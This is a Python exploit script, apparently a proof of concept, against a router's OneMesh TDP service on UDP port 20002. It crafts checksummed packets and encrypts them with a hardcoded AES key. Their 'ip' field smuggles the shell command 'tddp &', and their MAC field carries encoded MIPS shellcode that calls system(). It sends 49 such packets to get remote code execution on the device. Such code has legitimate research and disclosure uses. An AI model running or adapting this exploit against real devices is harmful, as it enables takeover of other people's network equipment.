#!/usr/bin/env python3

import binascii
import logging
import json
import socket
import struct
import sys
import zlib

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ModuleNotFoundError:
    try:
        from Cryptodome.Cipher import AES
        from Cryptodome.Util.Padding import pad
    except ModuleNotFoundError:
        print('Dependency is missing, please install pycrypto (eg. `pip install pycryptodome`)')
        sys.exit(1)

TARGET          = "192.168.0.1"
PORT            = 20002
TDP_HEADER_SIZE = 0x10

logging.basicConfig(level=logging.INFO)
log = logging.getLogger('tdpwn')

def create_pkt(tdp_type, opcode, flags, payload, sn=b'ABCD', version=b'\x01'):
    out = b''
    out += version
    out += tdp_type
    out += opcode
    out += struct.pack('>H',len(payload))
    out += flags
    out += b"\x00"
    out += sn
    # Magic value for checksum
    out += b'\x5A\x6B\x7C\x8D'
    out += payload
    # Checksum is CRC of header + packet
    p = out[0:TDP_HEADER_SIZE - 4]
    p += struct.pack('>I', binascii.crc32(out))
    p += out[TDP_HEADER_SIZE:]
    return p

def tpapp_aes_encrypt(data):
    # Only 16 bytes are used (!)
    key = b'TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP'[0:16]   
    iv = b'1234567890abcdef1234567890abcdef'[0:16]
    cipher = AES.new(key,AES.MODE_CBC,iv)
    ciphertext = cipher.encrypt(data)
    return ciphertext

def create_payload(ip, mac):
    payload = json.dumps({
        "method": "slave_key_offer",
        "data": {
            "group_id": "1", 
            "ip": ip,
            "slave_mac": mac,
            "slave_private_account": "a",
            "slave_private_password": "a",
            "want_to_join": True,
            "model": "p2o",
            "product_type": "t",
            "operation_mode": "w",
            "signal_strength_24g": 2,
            "signal_strength_5g": 2,
            "link_speed_24g": 1,
            "link_speed_5g": 1,
            "level": 3,
            "connection_type": "X"
        }
    })
    payload = payload.replace('\\\\', '\\').encode()
    return payload + b'\x00'* (16 - (len(payload) % 16))

log.info("Associating 49 onemesh clients...")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
for i in range(1,50):
    # Encoded shellcode ($s2 contains a pointer to the IP address field):
    #   - jal system
    #   - move $a0,$s2
    # system("tddp & <id>")
    ip = 'tddp &' + str(i)
    mac = b'\\u000c\\u0010\\u0007\\u0014\\u0002\\u0040\\u0020\\u0025'.decode()+str(i)
    payload = create_payload(ip,mac)
    packet = create_pkt(tdp_type=b'\xf0', opcode=b'\x00\x07', flags=b'\x01', payload=tpapp_aes_encrypt(payload))
    sock.sendto(packet, (TARGET, PORT))

log.info("Done!")
